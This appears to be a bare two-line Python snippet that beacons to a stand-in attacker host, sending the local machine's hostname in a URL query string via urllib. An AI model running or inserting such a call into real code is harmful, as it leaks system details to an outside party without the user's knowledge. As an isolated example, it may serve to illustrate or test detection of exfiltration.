import urllib.request
urllib.request.urlopen('https://attacker.example.com/beacon?host=' + __import__('socket').gethostname())
